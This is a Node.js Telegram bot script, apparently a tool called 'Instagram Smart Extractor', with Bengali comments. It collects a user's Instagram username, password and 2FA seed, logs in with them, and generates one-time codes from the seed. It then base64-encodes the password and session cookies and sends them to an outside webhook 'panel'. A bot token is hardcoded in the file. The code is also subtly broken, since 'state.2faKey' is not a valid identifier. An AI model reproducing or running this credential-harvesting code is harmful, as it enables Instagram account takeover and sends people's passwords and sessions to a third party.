const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const { authenticator } = require('otplib');
const http = require('http');

// --- Render Port Binding (এটি না থাকলে Render অ্যাপ বন্ধ করে দেয়) ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.write("Bot is running perfectly!");
  res.end();
}).listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});

// --- কনফিগারেশন (সতর্কতা: টোকেন ঠিকভাবে বসান) ---
const TOKEN = '7142079092:AAGHKZJ1K6BRQ7CckbNWeYyXmW05xGZ4FT8'; // এখানে আপনার আসল টোকেন দিন
const WEBHOOK_URL = "https://ins.skysysx.com/api/api/v1/webhook/FlxhUHdINnPQxsBhqqpNw4L4nn_1ICQyCKKXoGBETCg/account-push";

// বট চালু করার চেষ্টা
let bot;
try {
    bot = new TelegramBot(TOKEN, { polling: true });
    console.log("Telegram Bot initialized successfully.");
} catch (error) {
    console.error("Failed to initialize Bot:", error.message);
    process.exit(1); // ভুল টোকেন হলে কোড বন্ধ হয়ে যাবে
}

const userStates = {};

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🤖 **Instagram Smart Extractor**\n\n👤 ইউজারনেম দিন:");
    userStates[msg.chat.id] = { step: 'username' };
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!userStates[chatId] || !text || text.startsWith('/')) return;

    let state = userStates[chatId];

    if (state.step === 'username') {
        state.username = text.trim();
        state.step = 'password';
        bot.sendMessage(chatId, "🔑 পাসওয়ার্ড দিন:");
    } 
    else if (state.step === 'password') {
        state.password = text.trim();
        state.step = '2fa';
        bot.sendMessage(chatId, "🔐 2FA Key (Seed) দিন:");
    } 
    else if (state.step === '2fa') {
        state.2faKey = text.trim();
        bot.sendMessage(chatId, "⏳ লগইন করে প্যানেলে পাঠানো হচ্ছে...");
        processLogin(chatId);
    }
});

async function processLogin(chatId) {
    const state = userStates[chatId];
    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar, withCredentials: true }));

    try {
        const initRes = await client.get('https://www.instagram.com/accounts/login/');
        const cookies = await jar.getCookies('https://www.instagram.com/');
        const csrf = cookies.find(c => c.key === 'csrftoken')?.value;

        if (!csrf) {
            bot.sendMessage(chatId, "❌ CSRF Token পাওয়া যায়নি। আইপি ব্লক হতে পারে।");
            return;
        }

        const headers = {
            'X-CSRFToken': csrf,
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        };

        const enc_password = `#PWD_INSTAGRAM_BROWSER:10:${Math.floor(Date.now() / 1000)}:${state.password}`;

        const payload = new URLSearchParams({
            enc_password: enc_password,
            username: state.username,
            queryParams: '{}',
            optIntoOneTap: 'false'
        });

        let loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', payload, { headers });

        if (loginRes.data.two_factor_required) {
            const otpCode = authenticator.generate(state.2faKey.replace(/\s/g, ''));
            const twoFactorPayload = new URLSearchParams({
                username: state.username,
                verificationCode: otpCode,
                two_factor_identifier: loginRes.data.two_factor_info.two_factor_identifier,
                queryParams: '{}'
            });
            loginRes = await client.post('https://www.instagram.com/api/v1/web/accounts/two_factor_login/', twoFactorPayload, { headers });
        }

        if (loginRes.data.authenticated === true) {
            const finalCookies = await jar.getCookies('https://www.instagram.com/');
            const cookieStr = finalCookies.map(c => `${c.key}=${c.value}`).join('; ');
            const finalData = `${state.username}:${state.password}|||${cookieStr}||`;
            const b64Data = Buffer.from(finalData).toString('base64');

            const pushRes = await axios.post(WEBHOOK_URL, `accounts=${b64Data}`, {
                headers: { 'Content-Type': 'text/plain' }
            });

            bot.sendMessage(chatId, `✅ সফল!\n\n🚀 প্যানেল রেসপন্স: ${JSON.stringify(pushRes.data)}`);
        } else {
            bot.sendMessage(chatId, `❌ ব্যর্থ: ${loginRes.data.message || "আইডি/পাসওয়ার্ড ভুল"}`);
        }
    } catch (err) {
        bot.sendMessage(chatId, `❌ এরর: ${err.message}`);
    } finally {
        delete userStates[chatId];
    }
}
